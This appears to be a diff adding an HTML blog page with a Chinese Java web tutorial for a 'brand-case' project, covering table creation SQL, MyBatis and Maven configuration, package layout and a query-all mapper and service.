+<ul>
+<li>将资料的 brand-case 模块导入到 idea中</li>
+<li>执行资料中提供的 tb_brand.sql脚本</li>
+</ul>
+<p>在没有资料的情况下在idea中创建<code>maven</code>的web项目可以使用下面的方法</p>
+<p><code>file</code> -&gt; <code>new</code> -&gt; <code>module</code>-&gt;<code>Maven</code>-&gt;<code>Create from archetype</code>-&gt;<code>maven archetype</code>-&gt;<code>next</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330133227350.png" alt="image-20220330133227350"></p>
+<h4 id="2-1-工程准备"><a href="#2-1-工程准备" class="headerlink" title="2.1  工程准备"></a>2.1  工程准备</h4><p>将 <code>04-资料\01-初始工程</code> 中的 <code>brand-case</code> 工程导入到我们自己的 idea 中。工程结构如下：</p>
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825195522904.png" alt="image-20210825195522904" style="zoom:80%;">
+
+<h4 id="2-2-创建表"><a href="#2-2-创建表" class="headerlink" title="2.2  创建表"></a>2.2  创建表</h4><p>下面是创建表的语句</p>
+<pre><code class="hljs sql"><span class="hljs-comment">-- 删除tb_brand表</span>
+<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> tb_brand;
+<span class="hljs-comment">-- 创建tb_brand表</span>
+<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_brand (
+    <span class="hljs-comment">-- id 主键</span>
+    id           <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key auto_increment,
+    <span class="hljs-comment">-- 品牌名称</span>
+    brand_name   <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
+    <span class="hljs-comment">-- 企业名称</span>
+    company_name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
+    <span class="hljs-comment">-- 排序字段</span>
+    ordered      <span class="hljs-type">int</span>,
+    <span class="hljs-comment">-- 描述信息</span>
+    description  <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>),
+    <span class="hljs-comment">-- 状态：0：禁用  1：启用</span>
+    status       <span class="hljs-type">int</span>
+);
+<span class="hljs-comment">-- 添加数据</span>
+<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> tb_brand (brand_name, company_name, ordered, description, status)
+<span class="hljs-keyword">values</span> 
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
+       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
+       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>);</code></pre>
+
+<h4 id="2-3-配置信息"><a href="#2-3-配置信息" class="headerlink" title="2.3 配置信息"></a>2.3 配置信息</h4><h5 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h5><p>将mybatis的配置文件<code>mybatis-config.xml</code>copy到<code>src/main/resource</code>目录下</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span>
+<span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span>
+<span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.pojo&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span>
+                
+               <span class="hljs-comment">&lt;!-- 配置数据名 javastudy 用户名和密码--&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql:///javastudy?useSSL=false&quot;</span>/&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>
+       <span class="hljs-comment">&lt;!--扫描mapper 这里根据项目的mapper目录配置--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.mapper&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre>
+
+<h5 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h5><p><code>pom.xml</code></p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span>
+<span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>brand-case<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    
+    <span class="hljs-comment">&lt;!--web项目将打包成war格式 </span>
+<span class="hljs-comment">		普通项目则为jar </span>
+<span class="hljs-comment">	--&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
+
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
+        <span class="hljs-comment">&lt;!--Servlet--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+		
+        <span class="hljs-comment">&lt;!--MyBatis依赖--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-comment">&lt;!--MySQL--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.34<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+
+        <span class="hljs-comment">&lt;!--fastjson json转object时用到--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+                <span class="hljs-comment">&lt;!-- 这里可以配置tomcat的port和根路径 --&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre>
+
+<h5 id="包"><a href="#包" class="headerlink" title="包"></a>包</h5><p>在<code>/scr/main/java</code>中新建<code>pojo</code>、<code>mapper</code>、<code>service</code>、<code>web</code>、<code>util</code>等包</p>
+<table>
+<thead>
+<tr>
+<th>包名</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pojo</td>
+<td>存放实体类，比如Brand、User等</td>
+</tr>
+<tr>
+<td>mapper</td>
+<td>存放对应的Mapper接口 比如BrandMapper</td>
+</tr>
+<tr>
+<td>service</td>
+<td>存放提供服务的类BrandService</td>
+</tr>
+<tr>
+<td>web</td>
+<td>存放web层使用到的Servlet</td>
+</tr>
+<tr>
+<td>util</td>
+<td>存放工具包</td>
+</tr>
+</tbody></table>
+<p>创建<code>src/main/resources/com/itheima/mapper/</code>目录，该目录存放<code>BrandMapper.xml</code></p>
+<p>该文件在tomcat启动后自动保存到<code>src/main/java/com/itheima/mapper/BrandMapper.xml</code></p>
+<h2 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h2><p>登录和注册页面使用html和javascript设计</p>
+<p>展示页面使用Vue和element-ui设计出一个简单的展示页面</p>
+<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="1-查询所有"><a href="#1-查询所有" class="headerlink" title="1.查询所有"></a>1.查询所有</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>当页面加载完成后，数据需要展示到出来，所以需要在Vue中<code>mounted</code>构造函数中写发送异步请求的代码</li>
+<li>并且发送请求时无需携带参数</li>
+<li>服务器返回所有数据，其格式为json格式，返回的参数绑定到vue的模型中，显示到页面中</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330140534899.png" alt="image-20220330140534899"></p>
+<h4 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao"><a href="#dao" class="headerlink" title="dao"></a>dao</h5><p>在<code>com.itheima.mapper.BrandMapper</code>接口中添加<code>selectAll()</code>方法</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 查询所有</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span>
+<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
+<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>;</code></pre>
+
+<p>由于表中有些字段名和实体类中的属性名没有对应，所以需要在 <code>com/itheima/mapper/BrandMapper.xml</code> 映射配置文件中定义结果映射 ，使用<code>resultMap</code> 标签。映射配置文件内容如下：</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span></code></pre>
+
+<h5 id="service"><a href="#service" class="headerlink" title="service"></a>service</h5><p>在<code>com.itheima.mapper</code>中创建<code>BrandService</code>类</p>
+<pre><code class="hljs java">   <span class="hljs-comment">// 获取sqlSessionFactory</span>
+<span class="hljs-comment">// 该类 存放在util包中，封装后方便使用</span>
+   SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();
+
+   <span class="hljs-comment">/**</span>
+<span class="hljs-comment">    * 查询所有</span>
+<span class="hljs-comment">    * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment">    */</span>
+   <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>&#123;
+       SqlSession sqlSession = sqlSessionFactory.openSession();
+       <span class="hljs-comment">// 获取 BrandMapper</span>
+       BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+	<span class="hljs-comment">// 调用方法</span>
+       List&lt;Brand&gt; brands = mapper.selectAll();
+       sqlSession.close();
+       <span class="hljs-comment">// 返回查询到的数据</span>
+       <span class="hljs-keyword">return</span> brands;
+   &#125;</code></pre>
+
